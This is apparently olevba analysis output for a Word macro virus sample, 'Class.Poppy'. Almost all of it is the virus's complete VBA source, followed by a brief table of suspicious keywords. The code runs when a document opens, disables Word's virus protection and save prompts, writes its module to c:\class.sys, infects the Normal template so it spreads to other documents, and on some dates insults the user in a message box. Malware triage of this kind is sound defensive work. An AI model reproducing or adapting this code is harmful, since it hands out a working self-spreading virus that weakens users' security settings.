olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-290e9327419c0e151a07e507ce76b55686c2147a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-290e9327419c0e151a07e507ce76b55686c2147a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
On Error GoTo out
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
Options.VirusProtection = False
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
Options.SaveNormalPrompt = False
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
Options.ConfirmConversions = False
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
If nt > 70 And ad > 0 Then GoTo out
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
If nt < 70 Then
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
End If
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
host.codemodule.AddFromFile ("c:\class.sys")
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
With host.codemodule
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    For x = 1 To 4
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    .deletelines 1
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    Next x
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
End With
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
If nt < 70 Then
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    With host.codemodule
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    .replaceline 1, "Sub AutoClose()"
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    .replaceline 71, "Sub ToolsMacro()"
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    End With
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
End If
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
With host.codemodule
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    For x = 2 To 72 Step 2
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
    Next x
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
End With
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
out:
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
End Sub
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
Sub ViewVBCode()
'DURON27.04.2001 16:42:32HP LaserJet 1100 on LPT1:Документ1
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

